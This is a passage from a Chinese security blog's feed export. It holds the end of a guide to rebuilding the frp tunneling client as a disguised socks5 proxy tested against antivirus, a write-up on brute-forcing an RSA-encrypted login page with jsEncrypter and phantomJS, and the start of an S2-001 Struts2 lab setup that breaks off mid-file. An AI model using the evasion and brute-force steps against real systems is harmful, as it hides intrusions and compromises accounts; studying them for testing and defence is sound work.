class="hljs-keyword">string</span>, port <span class="hljs-keyword">string</span>, fport <span class="hljs-keyword">string</span>)</span></span> &#123;<br><span class="hljs-keyword">var</span> content <span class="hljs-keyword">string</span> = <span class="hljs-string">`</span><br><span class="hljs-string">[common]</span><br><span class="hljs-string">server_addr = `</span> + ip + <span class="hljs-string">`</span><br><span class="hljs-string">server_port = `</span> + port + <span class="hljs-string">`</span><br><span class="hljs-string">tls_enable = true</span><br><span class="hljs-string">token = Secde0666</span><br><span class="hljs-string">[http_proxy]</span><br><span class="hljs-string">type = tcp</span><br><span class="hljs-string">remote_port = `</span> + fport + <span class="hljs-string">`</span><br><span class="hljs-string">plugin = socks5</span><br><span class="hljs-string">`</span><br>fileContent = content<br>&#125;<br></code></pre></td></tr></table></figure><p>​    修改<code>runClient</code>函数，传入参数:</p><figure class="hljs highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runClient</span><span class="hljs-params">(cfgFilePath <span class="hljs-keyword">string</span>, ip <span class="hljs-keyword">string</span>, port <span class="hljs-keyword">string</span>, fport <span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(err error)</span></span> &#123;<br><span class="hljs-keyword">var</span> content <span class="hljs-keyword">string</span><br>getFileContent(ip, port, fport)<br><span class="hljs-comment">//content, err = config.GetRenderedConfFromFile(cfgFilePath)</span><br>content, err = fileContent, <span class="hljs-literal">nil</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grknhj.png" alt="image-20210513161652939"></p><p>​    同一文件，100行附近 <code>var rootCmd = &amp;cobra.Command</code> 中调用了<code>runClient()</code>，需要修改传入参数：</p><p><img src="https://z3.ax1x.com/2021/05/14/grkmNQ.png" alt="image-20210513162410862"></p><h4 id="编译打包-1"><a href="#编译打包-1" class="headerlink" title="编译打包"></a>编译打包</h4><p>​    <code>package.sh</code></p><figure class="hljs highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># compile for version</span><br>make<br><span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"make error"</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>frp_version=`./bin/frps --version`<br><span class="hljs-built_in">echo</span> <span class="hljs-string">"build version: <span class="hljs-variable">$frp_version</span>"</span><br><br><span class="hljs-comment"># cross_compiles</span><br>make -f ./Makefile.cross-compiles<br><br>rm -rf ./release/packages<br>mkdir -p ./release/packages<br><br>os_all=<span class="hljs-string">'linux windows darwin freebsd'</span><br>arch_all=<span class="hljs-string">'386 amd64 arm arm64 mips64 mips64le mips mipsle'</span><br><br><span class="hljs-built_in">cd</span> ./release<br><br><span class="hljs-keyword">for</span> os <span class="hljs-keyword">in</span> <span class="hljs-variable">$os_all</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">for</span> arch <span class="hljs-keyword">in</span> <span class="hljs-variable">$arch_all</span>; <span class="hljs-keyword">do</span><br>        frp_dir_name=<span class="hljs-string">"frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>"</span><br>        frp_path=<span class="hljs-string">"./packages/frp_<span class="hljs-variable">$&#123;frp_version&#125;</span>_<span class="hljs-variable">$&#123;os&#125;</span>_<span class="hljs-variable">$&#123;arch&#125;</span>"</span><br>        <span class="hljs-built_in">cd</span> ..<br>        rm -rf <span class="hljs-variable">$&#123;frp_path&#125;</span><br>    <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cd</span> -<br></code></pre></td></tr></table></figure><p>使用：<code>frpc -t 服务端IP -p 通讯端口 -f 代理使用端口</code></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -t 192.168.176.128 -p 7777 -f 9999<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grklj0.png" alt="image-20210513045854252"></p><h3 id="后续3-加资源-图标混淆？"><a href="#后续3-加资源-图标混淆？" class="headerlink" title="后续3:加资源/图标混淆？"></a>后续3:加资源/图标混淆？</h3><p>​    用 <code>Restorator</code> 加个图标，图标可以用 <code>BeCyIconGrabber</code> 从其他软件提取出来。</p><p>提取图标：</p><p><img src="https://z3.ax1x.com/2021/05/14/grk3uV.png" alt="image-20210511183416429"></p><p>打开<code>Restorator</code> ，拖入frp到资源树栏，添加资源，类型选图标，名称任意，拖入图标文件到下图【wps】中。</p><p><img src="https://z3.ax1x.com/2021/05/14/grk8BT.png" alt="image-20210511184242375"></p><p>然后右键软件另存即可。</p><p><img src="https://z3.ax1x.com/2021/05/14/grkGHU.png" alt="image-20210511184637872"></p><h3 id="后续4-UPX压缩减小体积？"><a href="#后续4-UPX压缩减小体积？" class="headerlink" title="后续4:UPX压缩减小体积？"></a>后续4:UPX压缩减小体积？</h3><p>​    @Secde0大佬说：<code>别压缩了，有些文件超过10m反而直接放行了，小的被拦截概率大</code>。我不信，上upx压缩后，用010Editor，删除一下头部标识：upx全部填充为0：</p><p><img src="https://z3.ax1x.com/2021/05/14/grkYEF.png" alt="image-20210511191202357"></p><p>压缩后确实加大查杀率了………</p><p>​    1为不压缩、5为upx压缩、4为压缩+改标识</p><p><img src="https://z3.ax1x.com/2021/05/14/grktN4.png" alt="image-20210511192131252"></p><h3 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h3><p>linu to Linux</p><p><img src="https://z3.ax1x.com/2021/05/14/grkaC9.png" alt="image-20210512050918076"></p><p>Windows to Linux</p><p><img src="https://z3.ax1x.com/2021/05/14/grkN4J.png" alt="image-20210512051445193"></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/231685" target="_blank" rel="noopener">https://www.anquanke.com/post/id/231685</a></p><p><a href="https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2" target="_blank" rel="noopener">https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2</a></p><p><a href="https://www.cnblogs.com/cwkiller/p/14108589.html" target="_blank" rel="noopener">https://www.cnblogs.com/cwkiller/p/14108589.html</a></p><p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</a></p><p><a href="https://github.com/fatedier/frp/pull/1919/files" target="_blank" rel="noopener">https://github.com/fatedier/frp/pull/1919/files</a></p><p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</a> </p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>某云课堂RSA加密登陆爆破小记</title>
      <link href="/posts/c8e756ab.html"/>
      <url>/posts/c8e756ab.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://z3.ax1x.com/2021/04/10/cdNJ6P.png"></p><a id="more"></a><p>​    某天，Leader随手甩了个目标，要对某课堂做测试。我xxx****，又是个开头登录页面的“破站”。</p><p><img src="https://z3.ax1x.com/2021/07/11/WCNR4x.png" alt="image-20210405234326102"></p><p>没有验证码，祭出Burp Suite爆之！</p><p>然而，然而，password字段居然是加密的，现在开发的安全意识都这么“高”了吗？</p><p><img src="https://z3.ax1x.com/2021/07/11/WCN4gO.png" alt="image-20210406234529785"></p><p>不想测这破站，只想摸鱼领个底薪，不测了，破站扔一边去…….</p><p><img src="https://z3.ax1x.com/2021/07/11/WCNh8K.png" alt="image-20210406235105275"></p><p>几天后…….</p><blockquote><p>   Leader：站点测试怎么样了，报告发一下</p><p>   Me：额，快好了，正在整理报告了，稍后发。</p></blockquote><p><img src="https://z3.ax1x.com/2021/07/11/WCNoKe.png" alt="image-20210407001057926"></p><p>再度打开burpsuite重新看看那破站了，唉……</p><hr><p>​    粗略的瞄了瞄，登录功能上没有验证码，且无错误次数等限制，只是通过 jsRSA 加密算法把 password 字段加密，而且公钥存在于 HTML 代码中，那么可以本地调用其加密函数把 payloads加密后再发送，从而暴力猜解用户账号密码。</p><p>加密函数：</p><p><img src="https://z3.ax1x.com/2021/07/11/WCN2U1.png" alt="image-20210405234444876"></p><h4 id="下载-实现加密的js脚本到本地"><a href="#下载-实现加密的js脚本到本地" class="headerlink" title="下载 实现加密的js脚本到本地"></a>下载 实现加密的js脚本到本地</h4><p><a href="http://xxxxx.com/javascripts/jsrsasign-latest-all-min.js" target="_blank" rel="noopener">http://xxxxx.com/javascripts/jsrsasign-latest-all-min.js</a></p><h4 id="下载加密脚本-BurpSuite扩展以及Apache-Maven"><a href="#下载加密脚本-BurpSuite扩展以及Apache-Maven" class="headerlink" title="下载加密脚本/BurpSuite扩展以及Apache Maven"></a>下载加密脚本/BurpSuite扩展以及Apache Maven</h4><p><a href="https://github.com/c0ny1/jsEncrypter" target="_blank" rel="noopener">https://github.com/c0ny1/jsEncrypter</a></p><p><a href="https://maven.apache.org/download.cgi" target="_blank" rel="noopener">https://maven.apache.org/download.cgi</a></p><h4 id="编译插件jsEncrypter"><a href="#编译插件jsEncrypter" class="headerlink" title="编译插件jsEncrypter"></a>编译插件jsEncrypter</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/11/WCNgER.png" alt="image-20210406001927535"></p><p>编译完后加载到Burp Suite中。</p><h4 id="编写phantomJS运行脚本"><a href="#编写phantomJS运行脚本" class="headerlink" title="编写phantomJS运行脚本"></a>编写phantomJS运行脚本</h4><p>使用 <code>test/TestScript/RSA/jsEncrypter_rsa.js</code> 模板。将实现加密算法的js文件引入模板脚本，在模板脚本的 <code>js_encrypt</code> 函数体中完成对加密函数的调用。</p><p><code>jsEncrypter_rsa.js</code></p><figure class="hljs highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">...............<br><br><span class="hljs-comment">// load js file</span><br><span class="hljs-keyword">var</span> wasSuccessful = phantom.injectJs(<span class="hljs-string">'jsrsasign-latest-all-min.js'</span>);<br><br><span class="hljs-comment">//Processing function</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">js_encrypt</span>(<span class="hljs-params">payload</span>)</span>&#123;<br><span class="hljs-keyword">var</span> newpayload;<br><span class="hljs-comment">/**Write the code that calls the encryption function to encrypt here***/</span><br><span class="hljs-keyword">var</span> prefix = <span class="hljs-string">"-----BEGIN PUBLIC KEY-----\n"</span>;<br><span class="hljs-keyword">var</span> suffix = <span class="hljs-string">"\n-----END PUBLIC KEY-----"</span>;<br><span class="hljs-keyword">var</span> key = <span class="hljs-string">"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzOIykY8AmZkoDPDL9zfgV48FKY1RcqWYj4YE/zzvNXDl8e7hnkNRNRHk3InE95ehk340iOumV+RJ9KdihoWKHqnSPH2wTxDdI2WFuI1FOfndL67fJliEHx9z6A7bfFUZZq9xuzoA/zPCZbLsfWfa2mbi96Qc1lI73kCa8sLmDwwIDAQAB"</span>;<br><span class="hljs-keyword">var</span> publicKey = prefix + key + suffix;<br><span class="hljs-keyword">var</span> pub = KEYUTIL.getKey(publicKey);<br><br><span class="hljs-comment">// encrypt.setPublicKey(key);</span><br>newpayload = KJUR.crypto.Cipher.encrypt(payload, pub);<br><span class="hljs-comment">/**********************************************************/</span><br><span class="hljs-keyword">return</span> newpayload;<br>&#125;<br>..............<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/11/WCN5vD.png" alt="image-20210405235300901"></p><h4 id="下载phantomJS并运行脚本"><a href="#下载phantomJS并运行脚本" class="headerlink" title="下载phantomJS并运行脚本"></a>下载phantomJS并运行脚本</h4><p><a href="https://phantomjs.org/download.html" target="_blank" rel="noopener">https://phantomjs.org/download.html</a></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">phantomJS.exe jsEncrypter_rsa.js<br></code></pre></td></tr></table></figure><h4 id="拦截登录包暴力破解"><a href="#拦截登录包暴力破解" class="headerlink" title="拦截登录包暴力破解"></a>拦截登录包暴力破解</h4><p>删除 Cookie 字段，关联扩展jsEncrypter：</p><p><img src="https://z3.ax1x.com/2021/07/11/WCN6b9.png" alt="image-20210406002807685"></p><p>整理报告，交差~</p><p><img src="https://z3.ax1x.com/2021/07/11/WCNTDH.png" alt="image-20210406003542562"></p><p>(o゜▽゜)o☆[BINGO!] 又可以愉快的学(摸)习(鱼)了。</p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>S2-001复现</title>
      <link href="/posts/41ac148a.html"/>
      <url>/posts/41ac148a.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://z3.ax1x.com/2021/03/27/6x3rhF.png" alt="image-20210310000217881"></p><a id="more"></a><h1 id="S2-001漏洞复现"><a href="#S2-001漏洞复现" class="headerlink" title="S2-001漏洞复现"></a>S2-001漏洞复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>​    <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><p>​    由于OGNL表达式的递归执行，造成了命令执行。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>​    Kali Linux</p><p>​    IntelliJ Idea 2020.3.2</p><p>​    Apache-Tomcat/9.0.43</p><p>​    Java Open JDK 8</p><p>先给IDEA装struts 2插件：</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3Efe.png" alt="image-20210302141314465"></p><p>新建项目：</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3eld.png" alt="image-20210302141636891"></p><p>下载strust2 jar，解压提取lib内的jar。</p><p><a href="https://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">commons-logging-1.0.4.jar<br>freemarker-2.3.4.jar<br>ognl-2.6.7.jar<br>struts2-api-2.0.1.jar<br>struts2-core-2.0.1.jar<br>xwork-2.0-beta-1.jar<br></code></pre></td></tr></table></figure><p>在 <code>WEB-INF</code> 下创建 <code>lib</code> 目录，放入所需的jar包。</p><p>导入依赖包到项目中：</p><p>​        左键IDEA左上角，文件-项目结构-模块 添加依赖的jar，勾选然后确定。</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3ZSH.png" alt="image-20210302143235678"></p><p><code>src</code> 下新建 <code>com.demo.action</code> 包，包下再新建 <code>LoginAction</code>  java类，代码如下：</p><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String username = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> String password = <span class="hljs-keyword">null</span>;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.username.isEmpty()) || (<span class="hljs-keyword">this</span>.password.isEmpty())) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"error"</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.username.equalsIgnoreCase(<span class="hljs-string">"admin"</span>))<br>                &amp;&amp; (<span class="hljs-keyword">this</span>.password.equals(<span class="hljs-string">"admin"</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"error"</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>src</code> 目录下新建 <code>struts.xml</code> ，内容如下：</p><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"S2-001"</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">"struts-default"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"login"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.demo.action.LoginAction"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"success"</span>&gt;</span>welcome.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"error"</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>web</code> 目录下新建 <code>welcome.jsp</code> 文件,内容如下：</p><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">"java"</span> contentType=<span class="hljs-string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="hljs-string">"UTF-8"</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">"s"</span> uri=<span class="hljs-string">"/struts-tags"</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="hljs-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=UTF-8"</span>&gt;<br>    &lt;title&gt;S2-001&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>修改 <code>index.jsp</code> 文件内容：</p><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">"java"</span> contentType=<span class="hljs-string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="hljs-string">"UTF-8"</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">"s"</span> uri=<span class="hljs-string">"/struts-tags"</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="hljs-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=UTF-8"</span>&gt;<br>    &lt;title&gt;S2-001&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-001 Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="hljs-comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;</span><br>&lt;/p&gt;<br>&lt;s:form action=<span class="hljs-string">"login"</span>&gt;<br>    &lt;s:textfield name=<span class="hljs-string">"username"</span> label=<span class="hljs-string">"username"</span>/&gt;<br>    &lt;s:textfield name=<span class="hljs-string">"password"</span> label=<span class="hljs-string">"password"</span>/&gt;<br>    &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>修改 <code>web.xml</code> 文件内容：</p><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span></span><br><span class="hljs-tag">         <span class="hljs-attr">id</span>=<span class="hljs-string">"WebApp_ID"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"3.1"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>S2-001 Example<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span 